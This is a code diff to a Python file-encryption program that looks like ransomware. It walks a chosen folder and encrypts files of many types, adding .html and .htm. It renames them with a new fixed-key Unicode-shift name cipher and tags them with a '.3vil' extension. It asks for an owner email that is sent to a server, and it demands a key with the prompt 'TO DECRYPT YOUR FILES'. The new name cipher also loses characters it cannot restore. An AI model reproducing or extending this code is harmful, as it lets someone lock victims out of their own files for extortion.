@@ -109,6 +109,55 @@ def done(status):
         time.sleep(0.15)
 
 
+class EncFile:
+    def __init__(self, shift):
+        self.shift = shift % 65536
+
+    def string_cipher(self, input_string):
+        # Define the character shift for the cipher
+        shift = self.shift % 65536  # Make sure the shift is within the range of Unicode characters
+
+        # Encode the input string using the specified shift
+        encoded_chars = []
+        for c in input_string:
+            new_char = chr((ord(c) + shift) % 65536)
+            # Replace invalid characters with underscores and escape existing underscores
+            if new_char in r'\/:*?"<>|_':  # Invalid characters for Windows file names
+                if new_char == '_':
+                    encoded_chars.append('__')  # Escape existing underscores
+                else:
+                    encoded_chars.append('_')  # Replace invalid characters with underscores
+            else:
+                encoded_chars.append(new_char)
+
+        # Join the characters back into a string
+        encoded_str = ''.join(encoded_chars)
+
+        return encoded_str
+
+    def string_decipher(self, encoded_string):
+        # Decode the encoded string using the specified shift
+        decoded_chars = []
+        i = 0
+        while i < len(encoded_string):
+            if encoded_string[i] == '_':
+                # Check if the underscore is escaped, i.e., '__'
+                if i + 1 < len(encoded_string) and encoded_string[i + 1] == '_':
+                    decoded_chars.append('_')
+                    i += 2
+                else:
+                    decoded_chars.append(encoded_string[i])
+                    i += 1
+            else:
+                decoded_chars.append(chr((ord(encoded_string[i]) - self.shift) % 65536))
+                i += 1
+
+        # Join the characters back into a string
+        decoded_str = ''.join(decoded_chars)
+
+        return decoded_str
+
+
 def keyboard_interrupt():
     os.system("cls")
     cont = input(f"are you sure you want to abort operation?\n:>> ")
@@ -135,6 +184,8 @@ encrypted_ext = ('.json',
                  '.jfif',
                  '.py',
                  '.shtml',
+                 '.html',
+                 '.htm',
                  '.mmp',
                  '.dibs',
                  '.dib',
@@ -351,48 +402,6 @@ def pause_clause(message):
     input(message)
 
 
-def encode_file_name(file_name, key):
-    key_len = len(key) - 1
-    index = 0
-    # Encrypt the file name using XOR encryption and base64 encoding
-    encrypted_file_name_bytes = bytearray()
-
-    for c in file_name:
-        # Perform XOR between the Unicode code point of the character and the key character
-        xor_result = ord(c) ^ ord(key[index])
-        # Convert the XOR result to a 2-byte representation and append it to encrypted_file_name_bytes
-        encrypted_file_name_bytes.extend(xor_result.to_bytes(1, byteorder='big', signed=False))
-        # data = data + xor_result.to_bytes(1, 'little')
-        if index >= key_len:
-            index = 0
-        else:
-            index += 1
-    return encrypted_file_name_bytes
-
-
-def decode_file_name(encoded_file_name, key):
-    key_len = len(key) - 1
-    index = 0
-
-    decrypted_file_name_bytes = bytearray()
-    for byte in encoded_file_name:
-        # Extract the XOR result from the byte
-        xor_result = ord(byte)
-        # Convert the key character to its Unicode code point
-        key_code_point = ord(key[index])
-        # Perform XOR between the XOR result and the key code point
-        decoded_char = chr(xor_result ^ key_code_point)
-        # Append the decoded character to the result string
-        decrypted_file_name_bytes += decoded_char
-
-        if index >= key_len:
-            index = 0
-        else:
-            index += 1
-
-    return decrypted_file_name_bytes
-
-
 def rename_file(file_path, key, decrypt=False):
     # Separate the file path, file name, and extension
     file_dir, file_name = os.path.split(file_path)
@@ -403,13 +412,11 @@ def rename_file(file_path, key, decrypt=False):
         file_base, file_ext = os.path.splitext(file_base)
 
     # Encode or decode the file name
+    output_from_class = EncFile(key)
     if decrypt:
-        new_file_base = str(encode_file_name(base64.b64decode(file_base).decode('utf-8'), key), 'utf-8').strip(
-            '\x00')
-        new_file_base = base64.b64decode(new_file_base.encode('utf-8')).decode('utf-8')
+        new_file_base = output_from_class.string_cipher(file_base)
     else:
-        file_base = base64.b64encode(file_base.encode('utf-8')).decode('utf-8')
-        new_file_base = base64.b64encode(encode_file_name(file_base, key)).decode('utf-8')
+        new_file_base = output_from_class.string_decipher(file_base)
 
     # Construct the new file name
     new_file_name = f"{new_file_base}{file_ext}"
@@ -447,7 +454,7 @@ def check():
                         if file_ext.lower() in encrypted_ext:
                             file_paths.append(root + '\\' + current_file)
                             paths.add(root)
-                            print(f"adding {root}/{current_file} to list")
+                            print(f"adding {root}/{current_file.encode('unicode_escape').decode('utf-8')} to list")
                 return True
             elif response_data['status'] == 'error' and response_data['msg'] == "already_exist":
                 os.system("cls")
@@ -490,16 +497,18 @@ def encrypt(key, state):
                         index = 0
                     else:
                         index += 1
-                print(f'<< {file} {state} sucessfuly>>')
-            if state == "Encrypted":
-                rename_file(file, key)
-            elif state == "Decrypted":
-                rename_file(file, key, decrypt=True)
+                print(f"<< {file.encode('unicode_escape').decode('utf-8')} {state} sucessfuly>>")
         except KeyboardInterrupt:
             keyboard_interrupt()
         except Exception as ep:
-            print(f'Failed to encrypt {file}\n{ep}\n\nSkipping{file}')
+            print(f"Failed to encrypt {file.encode('unicode_escape').decode('utf-8')}\n{ep}\n\nSkipping{file}")
             pass
+        else:
+            name_key = 10000  # 3000
+            if state == "Encrypted":
+                rename_file(file, name_key)
+            elif state == "Decrypted":
+                rename_file(file, name_key, decrypt=True)
 
         q.task_done()
 
@@ -520,13 +529,18 @@ if __name__ == '__main__':
     file_paths = []
     q = Queue()
     try:
-        action = int(
-            input(
-                f"Which action would you like to perform?\n1. Encrypt {pc_name} files\n2. Decrypt {pc_name} files\n:>> "))
-        pause_clause("Press the <ENTER> key to select folder\n")
-        Tk().withdraw()
-        sysUser = filedialog.askdirectory(title="Select Folder To Process All Files And Sub Directories")
-        if action == 1:
+        while True:
+            action = input(
+                f"Which action would you like to perform?\n1. Encrypt {pc_name} files\n2. Decrypt {pc_name} files\n:>> ")
+            if action not in ["1", "2"]:
+                continue
+            pause_clause("Press the <ENTER> key to select folder\n")
+            Tk().withdraw()
+
+            sysUser = filedialog.askdirectory(title="Select Folder To Process All Files And Sub Directories")
+            if sysUser:
+                break
+        if action == "1":
             while True:
                 owner = str(input(
                     "*IMPORTANT WARNING* Do not make a mistake on the email address as you might not have access to recover your files.\nEnter Valid Email Address :>> ")).lower()
@@ -551,7 +565,7 @@ if __name__ == '__main__':
                 "owner": owner,
                 "pcname": pc_name,
             }
-        if action == 2:
+        if action == "2":
             states = "Decrypted"
             encrypted_ext = (".3vil",)
             keys = str(input(f"TO DECRYPT YOUR FILES. \n{pc_name}\nEnter key to decrypt your files :>> "))
@@ -570,12 +584,7 @@ if __name__ == '__main__':
                 thread.start()
 
             q.join()
-            if action == 1:
-                done("Encryption")
-            elif action == 2:
-                done("Decryption")
-            else:
-                done("action")
+            done(states)
             time.sleep(30)
             exit(1)
 
